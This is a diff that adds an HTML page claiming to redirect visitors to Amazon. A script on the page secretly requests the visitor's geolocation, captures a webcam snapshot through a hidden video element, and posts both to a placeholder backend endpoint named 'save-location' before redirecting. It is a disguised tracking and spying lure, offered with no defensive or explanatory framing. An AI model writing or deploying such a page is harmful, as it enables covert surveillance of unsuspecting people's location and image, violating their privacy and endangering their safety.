@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting to Amazon</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f8ff;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Redirecting you to Amazon...</h1>
+
+    <video id="video" autoplay style="display: none;"></video>
+
+    <script>
+        // Get the location and send it along with the camera snapshot
+        function getLocationAndVideo() {
+            // Request location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        console.log("Latitude:", lat, "Longitude:", lon);
+
+                        // Request camera access
+                        navigator.mediaDevices.getUserMedia({ video: true })
+                            .then((stream) => {
+                                const video = document.getElementById('video');
+                                video.srcObject = stream;
+
+                                // Capture a snapshot from the video feed
+                                setTimeout(() => {
+                                    const snapshot = captureSnapshot(video);
+                                    // Send data to the backend
+                                    sendDataToServer(lat, lon, snapshot);
+                                }, 2000);  // Wait 2 seconds to capture the snapshot
+                            })
+                            .catch((error) => {
+                                console.error("Camera access denied or unavailable:", error);
+                                sendDataToServer(lat, lon, "Camera access denied");
+                            });
+                    },
+                    (error) => {
+                        console.error("Unable to retrieve location:", error);
+                        sendDataToServer("Location unavailable", "Location unavailable", "No camera data");
+                    }
+                );
+            } else {
+                console.error("Geolocation not supported.");
+            }
+        }
+
+        // Capture a snapshot from the video feed
+        function captureSnapshot(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');  // Return snapshot as a base64 image
+        }
+
+        // Send the location and camera snapshot to the backend
+        function sendDataToServer(lat, lon, snapshot) {
+            fetch('https://your-backend-url.onrender.com/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    snapshot: snapshot
+                })
+            })
+            .then(() => console.log("Data sent successfully"))
+            .catch((error) => console.error("Error sending data:", error));
+        }
+
+        // Start collecting data and immediately redirect to Amazon
+        getLocationAndVideo();
+        window.location.href = "https://www.amazon.com";
+
+    </script>
+
+</body>
+</html>
